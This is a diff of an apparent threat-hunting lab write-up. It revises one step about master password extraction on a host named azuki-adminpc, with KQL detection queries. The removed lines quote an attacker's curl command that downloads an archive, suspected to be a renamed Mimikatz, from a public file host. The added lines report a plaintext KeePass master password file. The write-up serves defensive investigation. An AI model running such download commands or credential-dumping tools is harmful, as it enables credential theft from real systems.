@@ -396,22 +396,22 @@ DeviceNetworkEvents
 
 ### 20. Credential Access: Master Password Extraction
 
-Searched for evidence of... 
-
-credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for evidence of master password extraction and discovered the following file which contained the extracted KeePass master password: KeePass-Master-Password.txt. The master password file was a plaintext file stored in the Documents\Passwords folder, providing the attacker with access to all credentials stored in the KeePass database.
 
 **Query used to locate events:**
 
 ```kql
-DeviceProcessEvents
+DeviceFileEvents
 | where TimeGenerated >= datetime(2025-11-19)
 | where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
-| project TimeGenerated, ProcessCommandLine
+| where ActionType == "FileCreated"
+| where FileName has "master"
+| where FileName endswith ".txt"
+| project TimeGenerated, FileName, FolderPath
 | order by TimeGenerated asc
 
 ```
-<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+<img width="2099" height="279" alt="BT_Q25" src="https://github.com/user-attachments/assets/fc460c31-6c9f-48da-b9e6-0d09915ff9cc" />
 
 ---
 
